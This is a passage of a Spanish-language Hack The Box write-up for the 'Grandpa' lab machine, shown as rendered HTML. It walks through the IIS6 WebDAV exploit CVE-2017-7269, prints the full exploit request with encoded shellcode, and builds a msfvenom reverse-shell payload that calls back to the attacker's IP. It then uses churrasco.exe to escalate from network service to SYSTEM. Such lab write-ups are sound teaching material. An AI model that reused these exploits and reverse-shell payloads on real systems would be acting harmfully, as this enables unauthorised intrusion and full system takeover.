+</span></span><span style="display:flex;"><span> Verified: False
+</span></span><span style="display:flex;"><span>File Type: ASCII text, with very long lines <span style="color:#f92672">(</span>2183<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>No entiendo muy bien cómo usarlo, podría ser que debemos meter los datos de la página web y un localhost o algo así. Creo que será mejor buscar como usar este Exploit o una variante de este, antes de utilizar otro.</p>
+<p>Investigando un poco, nos aparece este <strong>GitHub</strong>:</p>
+<ul>
+<li><a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269" target="_blank">Repositorio de g0rx: iis6-exploit-2017-CVE-2017-7269</a></li>
+</ul>
+<p>Este es una variante del Exploit anterior, observa como se usa:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">5</span>:
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#39;usage:iis6webdav.py targetip targetport reverseip reverseport</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p>Vamos a descargarlo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git  
+</span></span><span style="display:flex;"><span>Clonando en <span style="color:#e6db74">&#39;iis6-exploit-2017-CVE-2017-7269&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 6, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">6</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>Recibiendo objetos: 100% <span style="color:#f92672">(</span>6/6<span style="color:#f92672">)</span>, listo.
+</span></span></code></pre></div><p>Y ahora lo usamos, vamonos por pasos.</p>
+<ul>
+<li>Levantemos una <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>                         
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>Renombremos el Exploit para que sea <strong>.py</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mv iis6<span style="color:#ae81ff">\ </span>reverse<span style="color:#ae81ff">\ </span>shell IIS6_Exploit.py
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>IIS6_Exploit.py  README.md
+</span></span></code></pre></div><ul>
+<li>Probemos el Exploit:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 IIS6_Exploit.py 10.10.10.14 <span style="color:#ae81ff">80</span> Tu_IP <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>PROPFIND / HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: localhost
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">1744</span>
+</span></span><span style="display:flex;"><span>If: &lt;http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬&gt; <span style="color:#f92672">(</span>Not &lt;locktoken:write1&gt;<span style="color:#f92672">)</span> &lt;http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A&gt;
+</span></span></code></pre></div><ul>
+<li>Y estamos dentro:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>                         
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.14<span style="color:#f92672">]</span> <span style="color:#ae81ff">1030</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 5.2.3790<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> Copyright 1985-2003 Microsoft Corp.
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\n</span>etwork service
+</span></span></code></pre></div><p>¿Qué? ¿Ya somos Root? Pues no, no te emociones, somo Root pero en el servicio de la red, lo cual no nos ayuda mucho. Vamos a ver que hay dentro de la máquina.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="Windows">Enumeración de Máquina</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>c:\windows\system32\inetsrv<span style="color:#75715e">&gt;cd C:\</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> C:\
+</span></span><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is FDCB-B9EF
+</span></span><span style="display:flex;"><span> Directory of C:\
+</span></span><span style="display:flex;"><span>04/12/2017  05:27 PM    &lt;DIR&gt;          ADFS
+</span></span><span style="display:flex;"><span>04/12/2017  05:04 PM                 0 AUTOEXEC.BAT
+</span></span><span style="display:flex;"><span>04/12/2017  05:04 PM                 0 CONFIG.SYS
+</span></span><span style="display:flex;"><span>04/12/2017  05:32 PM    &lt;DIR&gt;          Documents and Settings
+</span></span><span style="display:flex;"><span>04/12/2017  05:17 PM    &lt;DIR&gt;          FPSE_search
+</span></span><span style="display:flex;"><span>04/12/2017  05:17 PM    &lt;DIR&gt;          Inetpub
+</span></span><span style="display:flex;"><span>12/24/2017  08:18 PM    &lt;DIR&gt;          Program Files
+</span></span><span style="display:flex;"><span>09/16/2021  12:52 PM    &lt;DIR&gt;          WINDOWS
+</span></span><span style="display:flex;"><span>04/12/2017  05:05 PM    &lt;DIR&gt;          wmpub
+</span></span><span style="display:flex;"><span>               2 File(s)              0 bytes
+</span></span><span style="display:flex;"><span>               7 Dir(s)   1,296,433,152 bytes free
+</span></span></code></pre></div><p>Hay algunos directorios que podrian contener algo, veámoslas:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt;cd ADFS</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> ADFS
+</span></span><span style="display:flex;"><span>C:\ADFS<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is FDCB-B9EF
+</span></span><span style="display:flex;"><span> Directory of C:\ADFS
+</span></span><span style="display:flex;"><span>04/12/2017  05:27 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>04/12/2017  05:27 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>               0 File(s)              0 bytes
+</span></span><span style="display:flex;"><span>               2 Dir(s)   1,296,429,056 bytes free
+</span></span><span style="display:flex;"><span>C:\ADFS<span style="color:#75715e">&gt;cd ..</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> ..
+</span></span></code></pre></div><p>No hay nada. Sigamos buscando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt;cd FPSE_search</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> FPSE_search
+</span></span><span style="display:flex;"><span>C:\FPSE_search<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is FDCB-B9EF
+</span></span><span style="display:flex;"><span> Directory of C:\FPSE_search
+</span></span><span style="display:flex;"><span>04/12/2017  05:17 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>04/12/2017  05:17 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>               0 File(s)              0 bytes
+</span></span><span style="display:flex;"><span>               2 Dir(s)   1,296,424,960 bytes free
+</span></span><span style="display:flex;"><span>C:\FPSE_search<span style="color:#75715e">&gt;cd ..</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> ..
+</span></span></code></pre></div><p>Nada de nada. Veamos que más hay:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt;cd Documents and Settings</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> Documents and Settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Documents<span style="color:#75715e"> and Settings&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is FDCB-B9EF
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:\Documents and Settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>04/12/2017  05:32 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>04/12/2017  05:32 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>04/12/2017  05:12 PM    &lt;DIR&gt;          Administrator
+</span></span><span style="display:flex;"><span>04/12/2017  05:03 PM    &lt;DIR&gt;          All Users
+</span></span><span style="display:flex;"><span>04/12/2017  05:32 PM    &lt;DIR&gt;          Harry
+</span></span><span style="display:flex;"><span>               0 File(s)              0 bytes
+</span></span><span style="display:flex;"><span>               5 Dir(s)   1,296,420,864 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Documents<span style="color:#75715e"> and Settings&gt;cd Harry</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> Harry
+</span></span><span style="display:flex;"><span>Access is denied.
+</span></span></code></pre></div><p>Aquí está el usuario y el administrador, aquí ya se aclara que no somos ni usuario.</p>
+<p>Veamos que privilegios tenemos y la información del sistema.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Documents<span style="color:#75715e"> and Settings&gt;whoami /priv</span>
+</span></span><span style="display:flex;"><span>whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                               State   
+</span></span><span style="display:flex;"><span>============================= ========================================= ========
+</span></span><span style="display:flex;"><span>SeAuditPrivilege              Generate security audits                  Disabled
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege       Create global objects                     Enabled
+</span></span></code></pre></div><p>Tenemos el privilegio <strong>SeImpersonatePrivilege</strong>, por lo que podemos aplicar el <strong>Juicy Potato</strong>.</p>
+<p>Veamos la información del sistema:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Documents<span style="color:#75715e"> and Settings&gt;systeminfo</span>
+</span></span><span style="display:flex;"><span>systeminfo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host Name:                 GRANPA
+</span></span><span style="display:flex;"><span>OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
+</span></span><span style="display:flex;"><span>OS Version:                5.2.3790 Service Pack 2 Build 3790
+</span></span><span style="display:flex;"><span>OS Manufacturer:           Microsoft Corporation
+</span></span><span style="display:flex;"><span>OS Configuration:          Standalone Server
+</span></span><span style="display:flex;"><span>OS Build Type:             Uniprocessor Free
+</span></span><span style="display:flex;"><span>Registered Owner:          HTB
+</span></span><span style="display:flex;"><span>Registered Organization:   HTB
+</span></span></code></pre></div><p>Muy bien, aquí podemos usar nuestra herramienta <strong>Windows Exploit Suggester</strong>, aprovechemosla y veamos que nos dice:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> initiating winsploit version 3.3...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> database file detected as xls or xlsx based on extension
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> attempting to read from the systeminfo input file
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> systeminfo input file read successfully <span style="color:#f92672">(</span>ascii<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> querying database file <span style="color:#66d9ef">for</span> potential vulnerabilities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> comparing the <span style="color:#ae81ff">1</span> hotfix<span style="color:#f92672">(</span>es<span style="color:#f92672">)</span> against the <span style="color:#ae81ff">356</span> potential bulletins<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> with a database of <span style="color:#ae81ff">137</span> known exploits
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> there are now <span style="color:#ae81ff">356</span> remaining vulns
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> exploitdb PoC, <span style="color:#f92672">[</span>M<span style="color:#f92672">]</span> Metasploit module, <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> missing bulletin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> windows version identified as <span style="color:#e6db74">&#39;Windows 2003 SP2 32-bit&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>M<span style="color:#f92672">]</span> MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span style="color:#f92672">(</span>3057191<span style="color:#f92672">)</span> - Important
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Salen varias opciones, pero no vamos a probar ninguno, esto es porque después de casi 3 horas de probar varios Exploits y en lo que tenía que reiniciar la máquina varias veces como mencione antes. ¡NO FUNCIONO NINGUNO!</p>
+<p>Los que probe fueron:</p>
+<ul>
+<li><em>MS14-070 - Ambas versiones</em></li>
+<li><em>MS11-046</em></li>
+<li><em>MS11-062</em></li>
+<li><em>MS15-051</em></li>
+</ul>
+<p>No sé porque razón ninguno funciono, así que en este caso ahora si vamos a aprovecharnos del privilegio <strong>SeImpersonatePrivilege</strong>. Para abusar de este privilegio vamos a usar <strong>Juicy Potato</strong>, pero esta será una variante pues la versión de <strong>Windows</strong> de la máquina es bastante vieja.</p>
+<h3 id="Churro">Escalando Privilegios con Churrasco</h3>
+<p>Con solo poner <strong>Windows server 2003 juicy potato exploit</strong> en el buscador, nos dará una página web, la abrimos y vemos la explicación.</p>
+<ul>
+<li><a href="https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/" target="_blank">Privilege Escalation (Windows) – JuicyPotato.exe</a></li>
+</ul>
+<p>La versión de <strong>Juicy Potato</strong> que ofrece esta página no nos servirá, pero si nos vamos hasta abajo ahí vendrá una variante llamada <strong>Churrasco.exe</strong>, esa es la que vamos a usar.</p>
+<ul>
+<li><a href="https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/" target="_blank">Privilege Escalation (Windows) – churrasco.exe</a></li>
+</ul>
+<p>Siguiendo las indicaciones de la página, una vez descargado el <strong>Churrasco.exe</strong> vamos a hacer lo siguiente:</p>
+<ul>
+<li>Crearemos un Payload para cargar una <strong>Reverse Shell</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>Tu_IP LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> EXITFUNC<span style="color:#f92672">=</span>thread -f exe -a x86 --platform windows -o shell.exe
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">324</span> bytes
+</span></span><span style="display:flex;"><span>Final size of exe file: <span style="color:#ae81ff">73802</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: shell.exe
+</span></span></code></pre></div><p><strong>OJO</strong>: Ten cuidado y no vayas a usar el mismo puerto que usaste para acceder a la máquina porque sigue en activo.</p>
+<ul>
+<li>Abrimos un servidor con <strong>Impacket</strong> para subir el Payload y el <strong>Churrasco</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-smbserver smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>Impacket v0.10.0 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span></code></pre></div><ul>
+<li>Descargamos los archivos en la máquina:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\WINDOWS\Temp\Privesc<span style="color:#75715e">&gt;copy \\Tu_IP\smbFolder\churrasco.exe churrasco.exe</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">copy</span> \\Tu_IP\smbFolder\churrasco.exe churrasco.exe
+</span></span><span style="display:flex;"><span>        1 file(s) copied.
+</span></span><span style="display:flex;"><span>C:\WINDOWS\Temp\Privesc<span style="color:#75715e">&gt;copy \\Tu_IP\smbFolder\shell.exe shell.exe</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">copy</span> \\Tu_IP\smbFolder\shell.exe shell.exe
+</span></span><span style="display:flex;"><span>        1 file(s) copied.
+</span></span></code></pre></div><p><strong>NOTA</strong>: Esta vez no usamos <strong>certutil.exe</strong> porque no funciona tampoco.</p>
+<ul>
+<li>Activamos una <strong>netcat</strong> con el puerto que pusimos en el Payload:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+</span></span></code></pre></div><ul>
+<li>Una vez dentro ambos archivos, activamos el <strong>Churrasco</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\WINDOWS\Temp\Privesc<span style="color:#75715e">&gt;churrasco.exe -d &#34;C:\WINDOWS\Temp\Privesc\shell.exe&#34;</span>
+</span></span><span style="display:flex;"><span>churrasco.exe -d <span style="color:#e6db74">&#34;C:\WINDOWS\Temp\Privesc\shell.exe&#34;</span>
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Current User: NETWORK SERVICE 
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Getting Rpcss PID ...
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Found Rpcss PID: 668 
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Searching for Rpcss threads ...
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Found Thread: 672 
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Thread not impersonating, looking for another thread...
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Found Thread: 676 
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Thread not impersonating, looking for another thread...
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Found Thread: 684 
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Thread impersonating, got NETWORK SERVICE Token: 0x730
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Getting SYSTEM token from Rpcss Service...
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Found SYSTEM token 0x728
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Running command with SYSTEM Token...
+</span></span><span style="display:flex;"><span>/churrasco/--&gt;Done, command should have ran as SYSTEM!
+</span></span></code></pre></div><ul>
+<li>Y ya somo <strong>Root</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.14<span style="color:#f92672">]</span> <span style="color:#ae81ff">1035</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 5.2.3790<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> Copyright 1985-2003 Microsoft Corp.
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\T</span>EMP&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>Solamente busca las flags en el directorio <strong>Documents and Settings</strong>, cada flag está en su respectivo directorio.</p>
+<h3 id="Nota">Nota Final</h3>
+<p>Todo este procedimiento, puedes volverlo a hacer con la <strong>máquina Granny</strong> de HTB, porque es la misma configuración, misma versión de <strong>Windows</strong>, mismo servicio, mismo todo. Por eso puedes repetir todo este procedimiento en dicha máquina.</p>
+<p><img src="/assets/images/htb-writeup-grandpa/granny_logo.png" alt=""></p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
